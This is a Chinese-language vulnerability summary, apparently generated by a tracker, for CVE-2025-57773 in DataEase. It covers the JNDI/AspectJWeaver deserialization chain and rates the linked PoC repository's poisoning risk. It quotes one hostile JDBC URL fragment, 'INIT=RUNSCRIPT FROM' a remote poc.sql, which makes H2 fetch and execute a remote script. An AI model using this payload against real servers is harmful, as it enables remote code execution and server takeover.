## CVE-2025-57773 - DataEase DB2 Aspectweaver 反序列化任意文件写入漏洞

**漏洞编号:** CVE-2025-57773

**漏洞类型:** 反序列化漏洞/任意文件写入/远程代码执行

**影响应用:** DataEase

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 2.10.12

**利用条件:** 需要目标系统安装 commons-collections 4.x 和 aspectjweaver-1.9.22.jar，且攻击者能够访问 DataEase 服务

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-57773是DataEase 2.10.12之前版本中存在的一个严重漏洞。由于对DB2数据库参数过滤不严，攻击者可以利用JNDI注入，进而触发AspectJWeaver的反序列化攻击，实现任意文件写入，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **JNDI注入：** 攻击者通过构造恶意的JNDI payload，并将其注入到DataEase的DB2数据库连接参数中。
2.  **AspectJWeaver反序列化：** DataEase使用AspectJWeaver处理数据库连接，当JNDI payload被触发时，AspectJWeaver会尝试反序列化该payload。
3.  **任意文件写入/远程代码执行：** 如果payload中包含恶意代码，反序列化过程将导致任意文件写入或远程代码执行。

**POC分析：**

POC利用了H2数据库的特性，通过构造包含`INIT=RUNSCRIPT FROM 'http://127.0.0.1:50025/poc.sql'`的JDBC URL，使H2在连接时执行远程SQL脚本。由于DataEase对JDBC URL的过滤存在缺陷，导致该恶意URL能够绕过验证，从而触发远程代码执行。

**投毒风险分析：**

该README.md文件本身没有明显的投毒代码。风险主要来自于攻击者托管的 `poc.sql` 脚本。因此`poison`值为10%。攻击者可能在`poc.sql`中包含恶意指令，例如下载和执行恶意程序等，从而实现对受害系统的完全控制。需要注意的是，这里的"投毒"并非作者直接植入，而是利用payload间接引入的风险，因此风险较低，但仍然存在。

**项目地址:** [B1ack4sh/Blackash-CVE-2025-57773](https://github.com/B1ack4sh/Blackash-CVE-2025-57773)

**漏洞详情:** [CVE-2025-57773](https://nvd.nist.gov/vuln/detail/CVE-2025-57773)